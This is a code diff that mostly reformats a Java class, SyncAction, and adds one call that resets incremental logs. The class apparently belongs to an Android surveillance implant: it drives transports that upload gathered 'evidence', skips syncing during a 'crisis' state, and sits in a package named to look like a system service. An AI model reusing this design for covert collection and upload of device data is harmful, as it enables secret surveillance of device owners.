@@ -12,10 +12,6 @@ package com.android.service.action;
 import java.util.Date;
 import java.util.Vector;
 
-import android.util.Log;
-import android.widget.Toast;
-
-import com.android.service.Status;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
@@ -32,7 +28,7 @@ import com.android.service.util.Check;
  */
 public abstract class SyncAction extends SubAction {
 
-	private static final String TAG = "SyncAction";
+	private static final String TAG = "SyncAction"; //$NON-NLS-1$
 
 	/** The log collector. */
 	protected EvidenceCollector logCollector;
@@ -76,20 +72,24 @@ public abstract class SyncAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		if (Cfg.DEBUG)
-			Check.requires(protocol != null, "execute: null protocol");
-		if (Cfg.DEBUG)
-			Check.requires(transports != null, "execute: null transports");
+		if (Cfg.DEBUG) {
+			Check.requires(protocol != null, "execute: null protocol"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.requires(transports != null, "execute: null transports"); //$NON-NLS-1$
+		}
 
 		if (status.synced == true) {
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Warn: " + "Already synced in this action: skipping");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "Already synced in this action: skipping"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Warn: " + "SyncAction - no sync, we are in crisis");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "SyncAction - no sync, we are in crisis"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
 			return false;
 		}
 
@@ -100,39 +100,45 @@ public abstract class SyncAction extends SubAction {
 		}
 
 		agentManager.reload(AgentType.AGENT_DEVICE);
+		agentManager.resetIncrementalLogs();
 
 		boolean ret = false;
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-			if (Cfg.DEBUG)
-				Check.log(TAG + " execute transport: " + transport);
-			if (Cfg.DEBUG)
-				Check.log(TAG + " transport Sync url: " + transport.getUrl());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " execute transport: " + transport); //$NON-NLS-1$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " transport Sync url: " + transport.getUrl()); //$NON-NLS-1$
+			}
 
 			if (transport.isAvailable()) {
-				if (Cfg.DEBUG)
-					Check.log(TAG + " execute: transport available");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " execute: transport available"); //$NON-NLS-1$
+				}
 				protocol.init(transport);
 
 				try {
 					Date before, after;
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						before = new Date();
+					}
 
 					ret = protocol.perform();
-					
-					//transport.close();
+
+					// transport.close();
 
 					if (Cfg.DEBUG) {
 						after = new Date();
-						long elapsed = after.getTime() - before.getTime();
-						Log.d("QZ", TAG + " (execute): elapsed=" + elapsed / 1000);
+						final long elapsed = after.getTime() - before.getTime();
+						Check.log( TAG + " (execute): elapsed=" + elapsed / 1000); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
 				} catch (final ProtocolException e) {
-					if (Cfg.DEBUG)
-						Check.log(TAG + " Error: " + e.toString());
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
+					}
 					ret = false;
 				}
 
@@ -140,19 +146,22 @@ public abstract class SyncAction extends SubAction {
 				// wantReload = protocol.reload;
 
 			} else {
-				if (Cfg.DEBUG)
-					Check.log(TAG + " execute: transport not available");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " execute: transport not available"); //$NON-NLS-1$
+				}
 			}
 
 			if (ret) {
-				if (Cfg.DEBUG)
-					Check.log(TAG + " Info: SyncAction OK");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: SyncAction OK"); //$NON-NLS-1$
+				}
 				status.synced = true;
 				return true;
 			}
 
-			if (Cfg.DEBUG)
-				Check.log(TAG + " Error: SyncAction Unable to perform");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: SyncAction Unable to perform"); //$NON-NLS-1$
+			}
 		}
 
 		return false;
@@ -165,6 +174,7 @@ public abstract class SyncAction extends SubAction {
 	 *            the conf params
 	 * @return true, if successful
 	 */
+	@Override
 	protected abstract boolean parse(final byte[] confParams);
 
 	/**
